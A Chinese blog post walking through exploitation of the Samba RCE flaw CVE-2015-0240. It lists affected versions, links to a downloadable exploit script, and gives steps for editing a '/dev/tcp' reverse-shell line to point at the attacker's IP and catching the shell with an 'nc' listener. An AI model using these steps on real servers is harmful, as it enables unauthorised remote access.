# (CVE-2015-0240)Samba 远程代码执行 - 暮日温柔 - 博客园

> 原文：[`www.cnblogs.com/daiorz/p/12009428.html`](https://www.cnblogs.com/daiorz/p/12009428.html)

**简介**

**Samba 是利用 SMB 协议实现文件共享的一款著名开源工具套件。日前 Samba 曝出一个严重安全漏洞，该漏洞出现在 smbd 文件服务端，漏洞编号为 CVE-2015-0240，可以允许攻击者远程远程执行恶意代码。**

作为一款老牌系统工具，Samba 的使用率非常高，更是作为很多 *BSD 和苹果 OS X 操作系统的组件存在，因此影响面非常大。Samba 支持的操作系统包括 Windows 95/98/NT，OS/2 和 Linux。

**受影响的产品**

```
Samba 3.5.x 全版本
Samba 3.6.x 到 Samba 3.6.25 之前的版本
Samba 4.0.x 到 Samba 4.0.25 之前的版本
Samba 4.1.x 到 Samba 4.1.17 之前的版本
Samba 4.2.x 到 Samba 4.2.0rc5 之前的版本
```

**脚本下载**

**[samba.py](https://www.lanzous.com/i7wvnsb)**

**漏洞利用**

第一步：编辑 samba.py 文件，编辑 21 行，将**host**改为目标靶机地址，

再将后面的 **bash>/dev/tcp/127.0.0.1** 的 ip 地址修改为攻击机的 ip

![](img/ee5ce49207df6864fb1cfd06c0495192.png)

第二步：poc 脚本将会利用溢出的 RCE 漏洞运行该命令使用命令 python samba-exploit.py 运行 poc 脚本

![](img/1b4f49d0464d9a3d8e8a60e7133ee385.png)

使用命令 nc -lvvp 1337 监听本地 1337 端口，并显示指令执行过程